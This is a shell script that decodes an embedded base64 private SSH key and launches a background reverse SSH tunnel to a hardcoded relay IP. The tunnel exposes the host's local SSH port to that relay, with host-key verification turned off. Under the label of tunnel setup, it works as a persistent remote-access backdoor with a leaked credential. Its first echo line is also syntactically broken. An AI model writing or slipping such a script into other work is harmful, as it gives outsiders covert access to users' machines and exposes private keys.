#!/bin/sh
set -e

echo l] Starting SSH tunnel setup..."

RELAY_HOST="117.31.178.161"
RELAY_PORT="2222"
RELAY_USER="app"
REMOTE_PORT="2224"

mkdir -p ~/.ssh
chmod 700 ~/.ssh

echo "[tunnel] Creating relay key from embedded base64..."
cat > ~/.ssh/idx_relay_ed25519.b64 <<'RELAYKEY'
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBODJFakx4cFFuR1dja3h3K3U0SjZsWUFjcGJtSFpncWRqTklPM2xwYXJkQUFBQUpEZlNrQzczMHBBCnV3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTgyRWpMeHBRbkdXY2t4dyt1NEo2bFlBY3BibUhaZ3Fkak5JTzNscGFyZEEKQUFBRUNwMVl6N2tLd3l4aUM0eVJaUExFUGloTWdCSWpSWWdORW5Tam9obU1IbHpUellTTXZHbENjWlp5VEhENjdnbnFWZwpCeWx1WWRtQ3AyTTBnN2VXbHF0MEFBQUFDV2xrZUMxeVpXeGhlUUVDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
RELAYKEY

base64 -d ~/.ssh/idx_relay_ed25519.b64 > ~/.ssh/idx_relay_ed25519
rm ~/.ssh/idx_relay_ed25519.b64
chmod 600 ~/.ssh/idx_relay_ed25519
echo "[tunnel] Relay key created successfully"

echo "[tunnel] Starting SSH reverse tunnel to $RELAY_HOST:$RELAY_PORT..."
nohup ssh -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null \
          -o ServerAliveInterval=60 \
          -o ServerAliveCountMax=3 \
          -i ~/.ssh/idx_relay_ed25519 \
          -N -R 127.0.0.1:$REMOTE_PORT:127.0.0.1:22 \
          -p $RELAY_PORT \
          $RELAY_USER@$RELAY_HOST \
          > ~/.ssh/tunnel.log 2>&1 &

TUNNEL_PID=$!
echo "[tunnel] SSH tunnel started (PID: $TUNNEL_PID)"
echo "$TUNNEL_PID" > ~/.ssh/tunnel.pid

sleep 2
if ps -p $TUNNEL_PID > /dev/null 2>&1; then
  echo "[tunnel] SSH tunnel is running"
else
  echo "[tunnel] ERROR: SSH tunnel failed to start" >&2
  cat ~/.ssh/tunnel.log >&2
  exit 1
fi
